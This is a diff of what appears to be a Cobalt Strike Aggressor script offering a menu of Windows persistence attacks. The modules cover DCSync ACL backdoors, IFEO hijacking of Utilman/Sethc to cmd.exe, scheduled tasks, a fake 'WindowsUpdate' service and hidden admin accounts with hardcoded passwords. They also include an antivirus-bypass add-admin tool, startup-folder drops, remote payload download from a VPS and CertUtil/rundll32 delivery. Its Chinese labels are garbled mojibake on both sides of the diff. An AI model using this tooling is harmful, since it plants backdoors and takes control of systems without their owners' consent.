@@ -1,8 +1,8 @@
-menu "ÊùÉÈôêÁª¥ÊåÅ" {
+menu "»®œﬁŒ¨≥÷" {
 	menu "DCSync" {
 		item "DCSync_add_ACE" {
 			$dialog = dialog("DCSync", %( bid => $1["@"] , user => "test" , Domain_prefix => "hack" , Domain_suffix => "com") , &DCSync_ADD_ACE);
-			dialog_description($dialog,"ÈÄöËøáDCSyncÂêëÊüê‰∏ÄÁî®Êà∑Ê∑ªÂä†ACEÊù•ÊîπÂèòACL,‰ª•Ê≠§ËææÂà∞ÊùÉÈôêÁª¥ÊåÅ");
+			dialog_description($dialog,"Õ®π˝DCSyncœÚƒ≥“ª”√ªßÃÌº”ACE¿¥∏ƒ±‰ACL,“‘¥À¥ÔµΩ»®œﬁŒ¨≥÷");
 			drow_text($dialog,"user","User:");
 			drow_text($dialog,"Domain_prefix","Domain_prefix");
 			drow_text($dialog,"Domain_suffix","Domain_suffix");
@@ -22,8 +22,8 @@ menu "ÊùÉÈôêÁª¥ÊåÅ" {
 		}
 		else
 		{
-			$dialog = dialog("ÈïúÂÉèÂä´ÊåÅ",%( bid => $1["@"] , Type => "Utilman" , CallBackFile => "c:\\Windows\\system32\\cmd.exe" ),&IFEO_INSTALL);
-			dialog_description($dialog,"ÈÄöËøáÈïúÂÉèÂä´ÊåÅËøõË°åÊùÉÈôêÁª¥ÊåÅ");
+			$dialog = dialog("æµœÒΩŸ≥÷",%( bid => $1["@"] , Type => "Utilman" , CallBackFile => "c:\\Windows\\system32\\cmd.exe" ),&IFEO_INSTALL);
+			dialog_description($dialog,"Õ®π˝æµœÒΩŸ≥÷Ω¯––»®œﬁŒ¨≥÷");
 			drow_combobox($dialog,"Type","Type:",@("Utilman.exe", "Sethc.exe"));
 			drow_text($dialog,"CallBackFile","CallBackFile:")
 			dbutton_action($dialog,"Exploit");
@@ -31,13 +31,13 @@ menu "ÊùÉÈôêÁª¥ÊåÅ" {
 		}
 	}
 	separator();
-	item "ËÆ°Âàí‰ªªÂä°" {
+	item "º∆ªÆ»ŒŒÒ" {
 		$dialog = dialog("Schtasks",%(bid => $1["@"], name => "Mikasa" , backfile => "C:\\Windows\\system32\\cmd.exe" , time => "minute" , modifier => "1"),&schtasks_add);
-		dialog_description($dialog,"ÈÄöËøáschatasksÂÆöÊó∂ÊâßË°åËÆ°Âàí‰ªªÂä°");
-		drow_text($dialog,"name","‰ªªÂä°ÂêçÁß∞:");
-		drow_text($dialog,"backfile","ÊâßË°åÁöÑÂëΩ‰ª§ÊàñÊñá‰ª∂:");
-		drow_combobox($dialog,"time","ÊâßË°åÊó∂Èó¥:",@("minute","hourly","daily","weekly","monthly"));
-		drow_text($dialog,"modifier","ÊâßË°åÂë®Êúü:");
+		dialog_description($dialog,"Õ®π˝schatasks∂® ±÷¥––º∆ªÆ»ŒŒÒ");
+		drow_text($dialog,"name","»ŒŒÒ√˚≥∆:");
+		drow_text($dialog,"backfile","÷¥––µƒ√¸¡ÓªÚŒƒº˛:");
+		drow_combobox($dialog,"time","÷¥–– ±º‰:",@("minute","hourly","daily","weekly","monthly"));
+		drow_text($dialog,"modifier","÷¥––÷‹∆⁄:");
 		dbutton_action($dialog,"Exploit!");
 		dialog_show($dialog);
 	}
@@ -53,7 +53,7 @@ menu "ÊùÉÈôêÁª¥ÊåÅ" {
                         dialog_show($Dialog);
 					}
 	separator();	
-	item "SCÂàõÂª∫ÊúçÂä°"{
+	item "SC¥¥Ω®∑˛ŒÒ"{
 			             $bid = $1['@'];
 			             $Dialog = dialog("Registration service",%(SerName => "WindowsUpdate", Path => "C:\\Windows\\system32\\cmd.exe",bid => $bid),&InstallService);
 			             dialog_description($Dialog, "Register an executable file as a service");
@@ -65,7 +65,7 @@ menu "ÊùÉÈôêÁª¥ÊåÅ" {
 
 			        separator();
 			 menu "UserCollect" {
-			 item "ÂçïÊú∫ÁéØÂ¢ÉÊ∑ªÂä†Áî®Êà∑" {
+			 item "µ•ª˙ª∑æ≥ÃÌº””√ªß" {
 
 				bupload($1["@"],script_resource("./modules/Persistence/Useradd.exe"));
 				bshell($1["@"],"attrib Useradd.exe +s +h");
@@ -75,7 +75,7 @@ menu "ÊùÉÈôêÁª¥ÊåÅ" {
 				bshell($1["@"],"del Useradd.exe");
 				blog($1["@"],"User:Saber pass:password@123");
 			}
-			menu "ÂçïÊú∫ÁéØÂ¢ÉÊ∑ªÂä†Áî®Êà∑(MyCsharp)" {
+			menu "µ•ª˙ª∑æ≥ÃÌº””√ªß(MyCsharp)" {
 
 			sub CsharpAddUser{
     		$Name = $3['Username'];
@@ -111,7 +111,7 @@ menu "ÊùÉÈôêÁª¥ÊåÅ" {
 
 			}
 
-		item "ÊøÄÊ¥ªguestÁî®Êà∑" {
+		item "º§ªÓguest”√ªß" {
 		
 		if(-isadmin $1["@"])
 			{
@@ -126,14 +126,14 @@ menu "ÊùÉÈôêÁª¥ÊåÅ" {
   }
 
 
-  item "ÂàõÂª∫ÁÆ°ÁêÜÂëòÁî®Êà∑" {
+  item "¥¥Ω®π‹¿Ì‘±”√ªß" {
     $bid = $1['@'];
-    $Dialog = dialog("Ê∑ªÂä†Êú¨Âú∞ÁÆ°ÁêÜÂëòÁî®Êà∑",%(username => "zjun$", passwd => "admin@123.", "groups" => "administrators", bid => $bid),&add_localuser);
-    dialog_description($Dialog, "Ê∑ªÂä†Êú¨Âú∞ÁÆ°ÁêÜÂëòÁî®Êà∑ÔºåÊ≥®ÊÑèË¥¶Êà∑Á≠ñÁï•‰∏≠ÁöÑÂØÜÁ†ÅÂ§çÊùÇÂ∫¶„ÄÇ");
+    $Dialog = dialog("ÃÌº”±æµÿπ‹¿Ì‘±”√ªß",%(username => "zjun$", passwd => "admin@123.", "groups" => "administrators", bid => $bid),&add_localuser);
+    dialog_description($Dialog, "ÃÌº”±æµÿπ‹¿Ì‘±”√ªß£¨◊¢“‚’Àªß≤ﬂ¬‘÷–µƒ√‹¬Î∏¥‘”∂»°£");
     drow_text($Dialog, "username", "username: ");
     drow_text($Dialog, "passwd", "passwd: ");
     drow_text($Dialog, "groups", "groups: ");
-    dbutton_action($Dialog, "ËøêË°å");
+    dbutton_action($Dialog, "‘À––");
     dialog_show($Dialog);
   }
   sub add_localuser{
@@ -145,13 +145,13 @@ menu "ÊùÉÈôêÁª¥ÊåÅ" {
   }
 
 
-  item "Ê∑ªÂä†ÂüüÁÆ°Áî®Êà∑"{
+  item "ÃÌº””Úπ‹”√ªß"{
     $bid = $1['@'];
-    $Dialog = dialog("Ê∑ªÂä†ÂüüÁÆ°",%(username => "zjun$",passswd => "admin@123.",bid => $bid),&add_domainuser);
-    dialog_description($Dialog, "Ê∑ªÂä†ÂüüÁÆ°ÁêÜÂëòÁî®Êà∑ÔºåÊ≥®ÊÑèË¥¶Êà∑Á≠ñÁï•‰∏≠ÁöÑÂØÜÁ†ÅÂ§çÊùÇÂ∫¶„ÄÇ");
+    $Dialog = dialog("ÃÌº””Úπ‹",%(username => "zjun$",passswd => "admin@123.",bid => $bid),&add_domainuser);
+    dialog_description($Dialog, "ÃÌº””Úπ‹¿Ì‘±”√ªß£¨◊¢“‚’Àªß≤ﬂ¬‘÷–µƒ√‹¬Î∏¥‘”∂»°£");
     drow_text($Dialog, "username", "username: ");
     drow_text($Dialog, "passswd", "passswd: ");
-    dbutton_action($Dialog, "ËøêË°å");
+    dbutton_action($Dialog, "‘À––");
     dialog_show($Dialog);
   }
   sub add_domainuser{
@@ -163,18 +163,18 @@ menu "ÊùÉÈôêÁª¥ÊåÅ" {
 
 
   menu "add-admin(bypass)"{
-    item "‰∏ä‰º†add-admin"{
+    item "…œ¥´add-admin"{
       local('$bid');
       foreach $bid ($1){
         bupload($1, script_resource("/modules/Persistence/add-admin.exe"));
-        blog($1, "È°πÁõÆÂú∞ÂùÄÔºöhttps://github.com/lengjibo/RedTeamTools/blob/master/windows/bypass360%E5%8A%A0%E7%94%A8%E6%88%B7/README.md")
+        blog($1, "œÓƒøµÿ÷∑£∫https://github.com/lengjibo/RedTeamTools/blob/master/windows/bypass360%E5%8A%A0%E7%94%A8%E6%88%B7/README.md")
       }
     }
-    item "ËøêË°åadd-admin" {
+    item "‘À––add-admin" {
       $bid = $1['@'];
       $dialog = dialog("add-admin", %(bid => $bid), &add_admin);
-      dialog_description($dialog, "ÊâßË°åÂêéËá™Âä®Ê∑ªÂä†‰∏Ä‰∏™Ë¥¶Êà∑ËøõÂÖ•ÁÆ°ÁêÜÂëòÁªÑÔºåÂπ∂Ëá™Âä®Âà†Èô§Á®ãÂ∫è„ÄÇÂ∏êÂè∑Ôºöhacker ÂØÜÁ†ÅÔºöP@ssw0rdÔºåÊ∑ªÂä†ÂÆåÊàêÂêéÂèäÊó∂‰øÆÊîπË¥¶Âè∑ÂêçÔºåËøá‰∫éÊãõÊëá„ÄÇ");
-      dbutton_action($dialog, "ËøêË°å");
+      dialog_description($dialog, "÷¥––∫Û◊‘∂ØÃÌº”“ª∏ˆ’ÀªßΩ¯»Îπ‹¿Ì‘±◊È£¨≤¢◊‘∂Ø…æ≥˝≥Ã–Ú°£’ ∫≈£∫hacker √‹¬Î£∫P@ssw0rd£¨ÃÌº”ÕÍ≥…∫Ûº∞ ±–ﬁ∏ƒ’À∫≈√˚£¨π˝”⁄’–“°°£");
+      dbutton_action($dialog, "‘À––");
       dialog_show($dialog);
     }
     sub add_admin{
@@ -184,20 +184,20 @@ menu "ÊùÉÈôêÁª¥ÊåÅ" {
   }
 	}
 
-	item "Ëá™ÂêØÁõÆÂΩï" {
+	item "◊‘∆Ùƒø¬º" {
 
-			show_message("Ë∑ü‰øÆÊîπÊ≥®ÂÜåË°®‰∏Ä‰∏™ÈÅìÁêÜ,Âè™ÊòØÊâßË°åÁöÑÊñπÂºè‰∏çÂêåËÄåÂ∑≤");
+			show_message("∏˙–ﬁ∏ƒ◊¢≤·±Ì“ª∏ˆµ¿¿Ì,÷ª «÷¥––µƒ∑Ω Ω≤ªÕ¨∂¯“—");
 			binput($1["@"],"C:\\Users\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe");
-			blog($1["@"],"Ëá™ÂêØÁõÆÂΩï‰Ωç‰∫éÔºö C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\,Âª∫ËÆÆcopyËøáÂêé‰ΩøÁî®attribÈöêËóèÊñá‰ª∂Â±ûÊÄß")
+			blog($1["@"],"◊‘∆Ùƒø¬ºŒª”⁄£∫ C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\,Ω®“Ècopyπ˝∫Û π”√attrib“˛≤ÿŒƒº˛ Ù–‘")
 	}
 
- menu "\"ÈÅ•Êµã\"ËÆ°Âàí‰ªªÂä°" {
-					item "Êó†Êñá‰ª∂ÊâßË°åÂëΩ‰ª§" {
+ menu "\"“£≤‚\"º∆ªÆ»ŒŒÒ" {
+					item "ŒﬁŒƒº˛÷¥––√¸¡Ó" {
 			$bid = $1['@'];
 			$dialog = dialog("Telemetry", %(command => "",bid => $bid), &Telemetry_cmd);
-			dialog_description($dialog, "ËæìÂÖ•cmdÂëΩ‰ª§Ôºåcmd /s ÂêéÈù¢ÁöÑÂÜÖÂÆπÔºåÊâßË°åÊñπÂºèÔºöTelemetry.exe install /command:calc");
+			dialog_description($dialog, " ‰»Îcmd√¸¡Ó£¨cmd /s ∫Û√Êµƒƒ⁄»›£¨÷¥––∑Ω Ω£∫Telemetry.exe install /command:calc");
 			drow_text($dialog, "command", "command:  ");	
-            dbutton_action($dialog, "ËøêË°å");
+            dbutton_action($dialog, "‘À––");
 			dialog_show($dialog);
         }
 sub Telemetry_cmd {
@@ -205,12 +205,12 @@ sub Telemetry_cmd {
 		bexecute_assembly($bid, script_resource("/modules/Persistence/Telemetry.exe"), $arg);
 }
 
-				item "ËøúÁ®ã‰∏ãËΩΩÊñá‰ª∂Ëá™ÂêØ" {
+				item "‘∂≥Ãœ¬‘ÿŒƒº˛◊‘∆Ù" {
 			$bid = $1['@'];
 			$dialog = dialog("Telemetry", %(url => "",bid => $bid), &Telemetry_url);
-			dialog_description($dialog, "ËæìÂÖ•exe‰∏ãËΩΩÂú∞ÂùÄÔºåÊâßË°åÊñπÂºèÔºöTelemetry.exe install /url:http://vps:8089/System.exe");
+			dialog_description($dialog, " ‰»Îexeœ¬‘ÿµÿ÷∑£¨÷¥––∑Ω Ω£∫Telemetry.exe install /url:http://vps:8089/System.exe");
 			drow_text($dialog, "url", "url:  ");	
-            dbutton_action($dialog, "ËøêË°å");
+            dbutton_action($dialog, "‘À––");
 			dialog_show($dialog);
         }
 sub Telemetry_url {
@@ -229,7 +229,7 @@ item "CertUtil Web Delivery" {
 		%defaults["port"] = 80;
 
 		$dialog = dialog("CertUtil Web Delivery (Stageless)", %defaults, &stage_attack);
-		dialog_description($dialog, "ÁîüÊàêpayload‰ΩøÁî®ccertutilËøúÁ®ã‰∏ãËΩΩÔºåÁÑ∂Âêé‰ΩøÁî®rundll32.exeÊâßË°å");
+		dialog_description($dialog, "…˙≥…payload π”√ccertutil‘∂≥Ãœ¬‘ÿ£¨»ª∫Û π”√rundll32.exe÷¥––");
 		drow_text($dialog, "uri", "URI Path: ", 20);
 		drow_text($dialog, "host", "Local Host: ");
 		drow_text($dialog, "port", "Local Port: ");
@@ -260,14 +260,14 @@ sub stage_attack {
 				item "SharpSQLTools" {
 			$bid = $1['@'];
 			$dialog = dialog("SharpSQLTools", %(host => "",username => "",password => "",type => "xp",cmd => "whoami",enable => "None",bid => $bid), &SharpSQLTools);
-			dialog_description($dialog, "ÂëΩ‰ª§Ë°åÁâàSQLTools");
+			dialog_description($dialog, "√¸¡Ó––∞ÊSQLTools");
 			drow_text($dialog, "host", "host:  ");	
 			drow_text($dialog, "username", "username:  ");	
 			drow_text($dialog, "password", "password:  ");			
 			drow_combobox($dialog, "type", "-xp/-sp", @("-xp", "-sp"));
 			drow_combobox($dialog, "enable", "enable", @("None", "enable"));
 			drow_text($dialog, "cmd", "cmd:  ");
-            dbutton_action($dialog, "ËøêË°å");
+            dbutton_action($dialog, "‘À––");
 			dialog_show($dialog);
         }
 sub SharpSQLTools {
